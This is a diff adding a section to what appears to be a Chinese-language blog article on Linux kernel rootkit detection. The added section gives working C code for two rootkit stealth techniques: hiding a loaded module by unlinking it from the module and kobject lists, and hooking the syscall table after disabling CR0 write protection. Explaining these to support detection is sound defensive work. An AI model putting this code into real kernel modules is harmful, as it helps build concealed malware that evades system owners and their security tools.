@@ -323,6 +323,59 @@ func<span class="w"> </span>getPsProcesses<span class="o">(</span>minAge<span cl
 </code></pre></div>
 <h4>Linux 内核态rootkit检测</h4>
 <p>Linux 内核态 rootkit 通过编写自定义的内核模块并将其加载到运行中的内核中，rootkit 可以获得更高的权限和更大的灵活性 。这类 rootkit 通常比用户态的更难检测和移除，因为它们在系统层次上运作，能够绕过大多数用户空间的安全机制。内核态 rootkit主要是修改内核的数据结构或者进行系统函数HOOK来实现隐藏和操控系统的行为, 那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。</p>
+<p>隐藏模块。具体功能如下：</p>
+<ul>
+<li>记录当前模块的链表前驱节点。</li>
+<li>从模块链表中删除当前模块。</li>
+<li>记录当前模块的kobject链表前驱节点。</li>
+<li>删除模块的kobject。</li>
+<li>从kobject链表中删除当前模块。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_previous<span class="p">;</span>
+static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_kobj_previous<span class="p">;</span>
+static<span class="w"> </span>char<span class="w"> </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+
+
+void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>module_hidden<span class="o">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;list.prev<span class="p">;</span>
+<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;list<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_kobj_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;mkobj.kobj.entry.prev<span class="p">;</span>
+<span class="w">    </span>kobject_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj.entry<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!module_hidden<span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:</p>
+<ul>
+<li>读取并保存当前CR0寄存器值。</li>
+<li>将原系统调用保存到orig_fn。</li>
+<li>修改CR0寄存器以允许写入系统调用表。</li>
+<li>替换系统调用表中的指定系统调用为新函数。</li>
+<li>恢复CR0寄存器值。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>static<span class="w"> </span>inline<span class="w"> </span>void<span class="w"> </span>write_cr0_forced<span class="o">(</span>unsigned<span class="w"> </span>long<span class="w"> </span>val<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>__force_order<span class="p">;</span>
+<span class="w">    </span>asm<span class="w"> </span>volatile<span class="o">(</span><span class="s2">"mov %0, %%cr0"</span><span class="w"> </span>:<span class="w"> </span><span class="s2">"+r"</span><span class="o">(</span>val<span class="o">)</span>,<span class="w"> </span><span class="s2">"+m"</span><span class="o">(</span>__force_order<span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+
+void<span class="w"> </span>hook_sys_call_table<span class="o">(</span>long<span class="w"> </span>int<span class="w"> </span>sysno,<span class="w"> </span>t_syscall<span class="w"> </span>hook_fn,
+<span class="w">                         </span>t_syscall<span class="w"> </span>*orig_fn<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>cr0<span class="p">;</span>
+<span class="w">    </span>pr_info<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"hook syscall number %ld"</span>,<span class="w"> </span>sysno<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!sys_call_table_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>pr_warn<span class="o">(</span>LOG_PREFIX
+<span class="w">                </span><span class="s2">"address of sys_call_table was not found, skip hook\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span><span class="nv">cr0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>read_cr0<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span>*orig_fn<span class="w"> </span><span class="o">=</span><span class="w"> </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="p">;</span>
+<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>~0x00010000<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hook_fn<span class="p">;</span>
+<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
